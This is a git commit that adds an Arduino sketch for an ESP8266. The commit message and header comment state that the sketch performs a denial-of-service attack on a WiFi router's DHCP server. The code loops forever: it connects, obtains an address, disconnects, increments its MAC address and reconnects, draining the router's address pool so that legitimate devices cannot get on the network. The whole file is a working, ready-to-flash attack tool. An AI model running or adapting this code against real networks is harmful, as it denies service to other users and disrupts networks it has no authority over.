1ea02aa24ac37fa70b02600d4960a261d555c978
Don Willingham <don.willingham@gmail.com>
2017-08-17 21:24:32 -0400

    DHCP Denial of Service on an ESP8266

---
+++ DHCPDOS.ino
@@ -0,0 +1,61 @@
+/*
+ *  This sketch attempts a Denial of Service attach on a DHCP server running
+ *  on a WiFi router.
+ *
+ */
+
+#include <ESP8266WiFi.h>
+extern "C" {
+#include "user_interface.h"
+}
+const char* ssid     = "ssid";
+const char* password = "password";
+
+byte *mac; // "current" mac/hardware address
+
+void setup() {
+  Serial.begin(9600);
+  delay(2000);
+  // Initialize mac address to actual mac address
+  mac = (byte*)malloc(6);
+  WiFi.macAddress(mac);
+}
+
+void loop() {
+  // We start by connecting to a WiFi network
+
+  Serial.println();
+  Serial.println();
+  Serial.print("Connecting to ");
+  Serial.println(ssid);
+
+  WiFi.hostname("");
+  WiFi.begin(ssid, password);
+
+  int dots = 0;
+  // wait for connection
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);
+    Serial.print(".");
+    dots++;
+    // terminal is typically 80 characters wide
+    if (dots > 79) {
+       Serial.println("");
+       dots = 0;
+    }
+  }
+
+  Serial.println("");
+  Serial.println("WiFi connected");  
+  Serial.println("IP address: ");
+  Serial.println(WiFi.localIP());
+  WiFi.disconnect();
+  // increment mac address
+  char hex = 5;
+  while (!(++mac[hex]) && (hex > 0)) {
+    hex--;
+  }
+  // set mac address
+  wifi_set_macaddr(STATION_IF, mac);
+}
+
